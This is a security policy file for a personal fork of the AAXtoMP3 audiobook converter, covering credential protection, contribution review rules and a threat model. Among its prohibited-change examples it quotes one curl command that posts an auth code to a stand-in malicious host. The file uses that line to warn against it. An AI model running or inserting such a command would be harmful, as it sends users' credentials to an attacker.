# Security Policy

---

## 📢 About This Fork

**This is a personal fork with improvements, not an official maintained version.**

- ✅ Original project: [KrumpetPirate/AAXtoMP3](https://github.com/KrumpetPirate/AAXtoMP3) (archived)
- ✅ This fork adds robustness improvements for AAXC file handling
- ⚠️ Not seeking to become an "official" replacement or maintained version
- 🤝 Contributions welcome, but expectations should remain casual

---

## Reporting Security Vulnerabilities

If you discover a security vulnerability in this fork, please report it privately:

1. **Do NOT open a public issue**
2. Use GitHub's private vulnerability reporting
3. Include:
   - Description of the vulnerability
   - Steps to reproduce
   - Potential impact
   - Suggested fix (if available)

## Security Considerations

### Authentication Code Protection

This tool requires Audible authentication codes (for AAX files) or voucher files (for AAXC files).

**NEVER commit authentication credentials to the repository.**

**Safe practices:**
- ✅ Use `.authcode` file in home directory: `~/.authcode`
- ✅ Use local `.authcode` file (protected by `.gitignore`)
- ✅ Keep `.gitignore` up to date
- ❌ Never hardcode auth codes in scripts
- ❌ Never commit `.authcode` files

### Protected Files

The following files should NEVER be committed (protected by `.gitignore`):
- `.authcode` - Contains Audible authentication code
- `*.aax` / `*.aaxc` - Copyrighted audiobook files
- `*.voucher` - AAXC decryption vouchers
- Converted output files (`.mp3`, `.m4a`, `.m4b`, `.flac`, `.ogg`)
- Personal audiobook libraries

### Code Review Requirements

All pull requests must:
1. Not modify `.gitignore` to expose sensitive files
2. Not add code that logs or transmits auth codes
3. Not add code that uploads or shares copyrighted content
4. Not introduce dependencies with known vulnerabilities
5. Maintain security best practices

### Prohibited Changes

The following changes will be **rejected**:

❌ **Removing or weakening `.gitignore` entries**
```diff
- .authcode
- *.aax
- *.aaxc
- *.voucher
```

❌ **Logging sensitive data**
```bash
# NEVER do this:
echo "Auth code: ${auth_code}"
log "Processing: ${personal_audiobook_title}"
```

❌ **Transmitting data to unauthorized endpoints**
```bash
# NEVER do this:
curl -X POST "https://malicious-site.com" -d "authcode=${auth_code}"
```

❌ **Storing credentials in code**
```bash
# NEVER do this:
auth_code="hardcoded-auth-here"
```

### Secure Contribution Guidelines

**Before submitting a PR:**

1. **Review your changes for sensitive data:**
   ```bash
   git diff | grep -iE "(auth.?code|activation.?bytes|voucher)"
   ```

2. **Verify `.gitignore` is intact:**
   ```bash
   git status --ignored
   ```

3. **Check for hardcoded credentials:**
   ```bash
   grep -r "auth_code=" . --include="*.sh" --include="*.bash"
   ```

4. **Run local security check:**
   ```bash
   # Ensure no sensitive files are staged
   git diff --cached --name-only | grep -E "(\.authcode|\.aax|\.voucher)"
   ```

### Dependency Security

**Bash script dependencies:**
- ffmpeg - Keep updated for security patches
- jq - JSON processor
- mp4art / mp4chaps - Metadata tools

**Check for updates:**
```bash
# CachyOS / Arch Linux / Manjaro
sudo pacman -Syu ffmpeg jq mp4v2-utils

# Ubuntu / Debian
sudo apt update && sudo apt upgrade ffmpeg jq mp4v2-utils

# Fedora / RHEL
sudo dnf upgrade ffmpeg jq mp4v2-utils

# macOS (Homebrew)
brew update && brew upgrade ffmpeg jq mp4v2-utils
```

### Local Security

**Protect your environment:**
```bash
# Secure your auth code file
chmod 600 ~/.authcode
chmod 600 .authcode

# Secure audiobook directories
chmod 700 ~/Audiobooks/
```

**Don't commit sensitive files:**
```bash
# Check what would be committed
git status

# Verify .gitignore is working
git check-ignore -v .authcode
git check-ignore -v test.aaxc
```

## Threat Model

### Threats We Protect Against

1. **Accidental Auth Code Exposure**
   - `.gitignore` prevents committing auth files
   - Clear documentation on secure practices

2. **Copyright Protection**
   - AAX/AAXC files not committed to repository
   - Converted output files not committed
   - Personal audiobook data stays local

3. **Voucher File Protection**
   - AAXC voucher files contain decryption keys
   - Protected by `.gitignore`
   - Should never leave local system

4. **Malicious Code Injection**
   - Code review required for all PRs
   - Fork owner approval required
   - Automated security checks

### Threats Outside Scope

- Compromise of Audible's DRM system (not our concern)
- Compromise of user's local system
- Social engineering attacks
- Physical access to user's computer
- Copyright violations by end users (user responsibility)

## GitHub Security Settings

### Recommended Settings (Repository Owner)

**Branch Protection Rules for `master` branch:**

1. **Enable: Require pull request reviews before merging**
   - Require 1 approval (if accepting PRs)

2. **Enable: Require status checks to pass**
   - Security workflow must pass

3. **Enable: Require conversation resolution before merging**

**Repository Settings:**

- ✅ Enable vulnerability alerts (Dependabot)
- ✅ Enable automated security fixes
- ✅ Enable private vulnerability reporting
- ✅ Disable wiki (if not used)
- ✅ Moderate issues carefully (if enabled)

## Security Checklist for Contributors

Before submitting a PR, verify:

- [ ] No auth codes or voucher content in code
- [ ] No audiobook files (AAX/AAXC) committed
- [ ] No personal audiobook titles in commit messages
- [ ] `.gitignore` not modified to expose sensitive files
- [ ] No new external network calls without discussion
- [ ] Code doesn't log sensitive information
- [ ] Documentation updated if security-relevant changes
- [ ] Tests pass (if applicable)
- [ ] Follows existing code style

## Security Checklist for Maintainers

When reviewing PRs:

- [ ] Verify no sensitive data committed
- [ ] Check for malicious code patterns
- [ ] Review all file modifications carefully
- [ ] Verify `.gitignore` changes (if any)
- [ ] Check for data exfiltration attempts
- [ ] Review new dependencies
- [ ] Verify error handling doesn't expose secrets
- [ ] Check logging statements for sensitive data
- [ ] Run code locally before merging
- [ ] Verify documentation accuracy

## Automated Security Checks

See `.github/workflows/security-checks.yml` for automated security scanning.

## Removing Sensitive Data from Git History

If you accidentally commit sensitive data:

```bash
# Remove a file from all history (destructive!)
git filter-branch --force --index-filter \
  "git rm --cached --ignore-unmatch .authcode" \
  --prune-empty --tag-name-filter cat -- --all

# Or use BFG Repo-Cleaner (faster, recommended)
bfg --delete-files .authcode

# Force push (only if you're sure!)
git push --force --all
```

**Then:**
1. Immediately change your Audible password
2. Generate a new authentication code
3. Update your local `.authcode` file

## Legal Notice

### Copyright and DRM

This tool is designed for **personal use only**:

- ✅ Converting audiobooks you legally purchased
- ✅ Format shifting for personal convenience
- ✅ Backup of your Audible library
- ❌ Sharing converted files with others
- ❌ Circumventing DRM for piracy
- ❌ Distribution of copyrighted content

**Users are responsible for complying with:**
- Audible Terms of Service
- Local copyright laws
- DMCA (US) / equivalent laws in your jurisdiction

## Contact

For security concerns, contact the fork maintainer through GitHub.

---

**Last Updated:** 2025-11-21
**Version:** 1.0
